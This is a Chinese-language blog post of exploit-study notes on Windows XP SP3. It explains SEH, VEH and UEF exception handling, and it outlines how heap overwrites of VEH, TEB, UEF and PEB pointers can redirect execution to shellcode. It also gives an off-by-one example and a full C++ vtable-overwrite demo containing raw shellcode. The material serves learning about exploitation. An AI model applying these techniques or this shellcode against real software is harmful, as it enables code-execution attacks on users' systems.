---
title: 漏洞学习笔记-009-Windows异常的深入
description: 深入挖掘Windows异常处理，附带一些其它的利用方法 
date: 2020-10-25 15:09:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---
 
声明：实验环境为 Windows XP SP3

本文来源：[Moeomu的博客](/zh-cn/posts/漏洞学习笔记-009-Windows异常的深入/)

## 不同级别的SEH

- 异常处理的最小作用域是线程，每个线程都拥有自己的SEH链表，发生错误时，首先使用自己的SEH进行处理
- 一个进程中可能同时存在很多个线程，进程中也由一个能处理全局的异常处理。当线程自身的SEH无法修复错误时，进程的SEH将处理异常。这种异常处理可能会影响到进程下属的所有线程
- 操作系统为所有程序提供了一个默认的异常处理函数，当所有的异常处理函数都无法处理错误时，这个默认的异常处理函数将被最终调用，结果一般时显示要给错误对话框
- 以下是简单的异常处理流程
  - 首先执行线程中距离汉鼎最近的SEH或异常处理函数
  - 若失败，则依次尝试执行SEH链表中后续的异常处理函数
  - 若SEH链中所有的异常处理函数都没能处理异常，则执行进程的异常处理
  - 若仍然失败，系统默认的异常处理函数将被调用，程序崩溃的对话框将弹出

### 线程的异常处理

> 线程通过TEB引用SEH链表依次尝试处理异常的过程

- 用于异常处理的回调函数有4个参数
  - `pExecpt`：指向一个重要的结构体：`EXCEPTION_RECORD`，此结构包含了若干个与异常相关的信息，如异常的类型，异常发生的地址等
  - `pFrame`：指向栈帧中的SEH结构体
  - `pContext`：指向`Context`结构体，此结构体包含了所有寄存器的状态
  - `pDispatch`：未知
- 回调函数执行前，系统将上述异常发生时的断点信息压栈。更绝这些描述，回调函数可以轻松处理异常
- 回调函数返回后，操作系统会更具返回的结果决定下一步做什么。异常处理函数可能返回两种结果
  - `0(Exception Continue Excetutuon)`：代表异常成功处理，将返回程序发生异常的地方，继续执行后续指令
  - `1(Exception Continue Search)`：异常处理失败，将顺着SEH链表搜索其它可以用于异常处理的函数并尝试处理
- `UNWIND`操作
  - 异常发生时，操作系统将顺着SEH链表搜索处理异常的句柄，一旦找到，系统将已经遍历过的SEH异常处理函数再调用一遍
  - 主要目的是通知前边处理异常失败的SEH，系统将它们遗弃了，请它们清理现场释放资源，之后将SEH结构体从链表中拆除
  - 当`pExcept`指向的`EXCEPTION_RECORD`结构体中`ExceptionCode`被设置为`0xC0000027(STATUS_UNWIND)`，`ExceptionFlags`被设置为`0x2(EH_UNWINDING)`时，对回调函数的调用就属于`unwind`调用
  - 此操作通过`kernel.32`中的一个导出函数`RtlUnwind`实现
  - 在使用回调函数之前，系统将判断当前是否处于调试状态，如果是调试状态，将把异常交给调试器处理

> `EXCEPTION_RECORD`

```CPP
typedef struct _EXCEPTION_RECORD {
    DWORD   ExceptionCode;
    DWORD   ExceptionFlags; //异常标志位
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID   ExceptionAddress;
    DWORD   NumberParameters;
    DWORD   ExceptionInformation [EXCEPTION_MAXIMUM_PARAMETERS];
 } EXCEPTION_RECORD;
```

> `RtlUnwind`

```CPP
void RtlUnwind(
    PVOID               TargetFrame,
    PVOID               TargetIp,
    PEXCEPTION_RECORD   ExceptionRecord,
    PVOID               ReturnValue
);
```

### 进程异常处理

> 所有线程中发生的异常如果没有被线程或异常处理函数后者调试器处理掉，最终将交给进程中异常处理函数处理

- 进程异常处理的回调函数需要通过API函数`SetUnhandleExceptionFilter`来注册
- 此函数返回值有3种
  - `1(EXCEPTION_EXECUTE_HANDLER)`：表示错误得到正确的处理，程序将退出。
  - `0(EXCEPTION_CONTINUE_SEARCH)`：无法处理错误，将错误转交给系统默认的异常处理。
  - `-1(EXCEPTION_CONTINUE_EXECUTION)`：表示错误得到正确的处理，并将继续执行下去。类似于线程的异常处理，系统会用回调函数的参数恢复出异常发生时的断点状况，但这时引起异常的寄存器值应该已经得到了修复。

> `SetUnhandleExceptionFilter`

```CPP
LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter(
 LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter
);
```

### 系统默认的异常处理UEF

> 如果进程异常处理失败或者程序没有进程异常处理，系统默认的异常处理函数`UnhandledExceptionFilter()`将被调用，这个函数是一个终极异常处理函数`UEF(Unhandled Exception Filter)`

> MSDN中将它称为“top-level exception handler”，即顶层异常处理，或是最后使用的异常处理

- 在`Windows 2000- Windows XP`，此函数将检查注册表`HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AeDebug`中的内容，`Auto`项标识是否弹出对话框，`1`表示不弹出直接结束程序，其它均会弹出
- `Debugger`项目指明了系统默认调试器

### 异常流程总结

- CPU执行捕获异常，内核接过控制权开始内核态异常处理
- 内核异常处理结束，将控制权交给用户态
- 用户态第一个处理异常的函数时`ntdll.dll`中的`KiUserExceptionDispatcher()`函数
- 此函数首先检查程序是否调试态，若被调试，将异常交给调试器处理
- 尝试加入`VEH(Vectored Exception Handling)`去处理异常
- 非调试态，调用`RtlDispatchException()`函数对线程的SEH链表进行遍历，若能找到处理异常的回调函数，将再次遍历先前调用过的SEH句柄，即unwind操作，保证异常处理机制的完整性
- 若栈中所有的SEH都失败了，进程拥有异常处理函数，将调用此函数
- 若自定义的进程异常处理失败，系统默认的UEF将被调用

## 其它异常处理利用思路

### VEH的利用

> `WindowsXP`开始，增加了一种新的异常处理：`VEH(Vectored Exception Handler)`向量化异常处理

- VEH和进程异常处理类似，都是基于进程，需要使用API注册回调函数
- 可以胡策多个VEH，结构体之间串成双向链表
- 处理优先级次于调试器处理，高于SEH处理
- 注册VEH可以执行它在链中的位置
- VEH保存在堆中
- unwind操作不会涉及VEH进程类的异常处理

> VEH结构

```CPP
struct _VECTORED_EXCEPTION_NODE {
    DWORD m_pNextNode;
    DWORD m_pPreviousNode;
    PVOID m_pfnVectoredHandler;
}
```

> VEH注册函数

```CPP
PVOID AddVectoredExceptionHandler(
    ULONG FirstHandler,
    PVECTORED_EXCEPTION_HANDLER VectoredHandler
);
```

- 如果利用堆溢出的DWORD SHOOT修改指向VEH头节点的指针，在异常处理开始后，能引导程序执行shellcode

### 攻击TEB中的SEH头节点

> 线程的SEH链通过TEB第一个DWORD指针指向离栈顶最近的SEH，若修改TEB中这个指针，将在异常发生的时候将程序引导到shellcode中去只执行

- 局限性
  - 一个进程存在多个线程
  - 每个线程都有一个TEB
  - 第一个TEB开始于`0x7FFDE000`
  - 新线程的TEB将紧随前边的TEB，之间相隔`0x1000`字节，向内存低地址方向增长
  - 多线程程序很难判断当前线程是哪个，以及对应的TEB在什么位置，攻击TEB中SEH头节点的方法一般用于单线程程序

> 尽管可以创建很多线程或者关闭大量线程去试图控制TEB排列，但是多线程状态下不应该执着地利用TEB了

### 攻击UEF

> 堆溢出时DOWRD SHOOT的target指向UEF的入口，data为shellcode的入口地址，再制造一个只能由UEF来处理的异常

- 结合使用跳板技术能够使exploit成功率更高
- 异常发生时，EDI往往指向堆中离shellcode不远的地方
- 将UEF的句柄覆盖成一条`CALL DWORD PTR [EDI + 0x78]`的指令地址就往往可以让程序跳入shellcode
- 或者`CALL DWORD PTR [ESI + 0x4C]`或者`CALL DWORD PTR [EBP + 0x74]`均可

### 攻击PEB中函数指针

- ExitProcess()再清理现场的时候需要进入临界区以同步线程，最终将调用RtlEnterCriticalSection()和RtlLeaceCriticalSection()
- PEB的地址永远不变，比起TEB来说是更好的选择

## `off by one`的利用

> 漏洞利用技术的层次：
>
> - 基础的栈溢出利用：利用返回地址劫持进程
> - 高级的栈溢出利用：只能淹没部分EBP无法抵达返回地址的利用，如对strncpy函数误用时产生的`off by one`的利用
> - 堆溢出以及格式化串漏洞的利用

### 利用

> 代码片段

```CPP
void off_by_one(char * input)
{
  char buf[200];
  int i = 0, len = 0;

  len = sizeof(buf);

  for(i = 0; input[i]&&(i <= len); i++)
  {
    buf[i] = input[i];
  }
}
```

- 此函数试图防止在字符串复制时发生数组越界，但循环中`i <= len`在边界控制中出错了，可能会溢出一个字节
- 我们可以在255个字节的范围内控制EBP，也可能控制程序某些重要参数

## 攻击C++虚函数

### 理论

- C++类的成员函数在声明的时候，若使用了virtual关键字修饰，则是虚函数
- 一个类中可能由很多个虚函数
- 虚函数的入口地址被统一保存在虚表(Vtable)中
- 对象在使用虚函数的时候，先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用
- 虚表指针保存在对象的内存空间，紧接着虚表指针的是其它成员变量
- 虚函数只有通过对象指针的引用才能显示出动态调用的特性

### 尝试

- 对象中的成员变量溢出后，有机会修改对象中的虚表指针或者修改虚表中的虚函数指针
- 这样就有可能会执行shellcode

> 代码尝试

```CPP
/*
Test on Windows XP SP3 without any other patch.
*/

#include "windows.h"
#include "iostream.h"

char shellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\xAC\xBA\x40\x00"; // set fake virtual function pointer

class Failwest
{
  public:
    char buf[200];
    virtual void test(void)
    {
      cout << "Class Vtable::test()" << endl;
    }
};

Failwest overflow, *p;

void main(void)
{
  char * p_vtable;
  p_vtable = overflow.buf - 4; // point to virtual table
  cout << "Buf Address:" << &overflow.buf << endl;
  // reset fake virtual table to 0x0040BB5C
  // the address may need to ajusted via runtime debug
  p_vtable[0] = 0x5C;
  p_vtable[1] = 0xBB;
  p_vtable[2] = 0x40;
  p_vtable[3] = 0x00;
  strcpy(overflow.buf,shellcode); // set fake virtual function pointer
  p = &overflow;
  p->test();
}
```

### 说明

- 虚表指针位于成员变量`char buf[200]`之前，程序中通过`p_vtable = overflow.buf - 4`定位到此指针
- 修改虚表指向缓冲区`0x0040BB5C`处，这里是shellcode的末尾，在这里填入`0x0040BAAC`也就是shellcode的起始地址，程序将跳去执行shellcode
- 这种方式既不是栈溢出也不是堆溢出，因为对象的内存空间位于堆中，但是却是连续线性覆盖的空间，所以准确的说应该叫做“数组溢出”或者“连续性覆盖”
- 使用DWORD SHOOT攻击虚表可能会更加简单
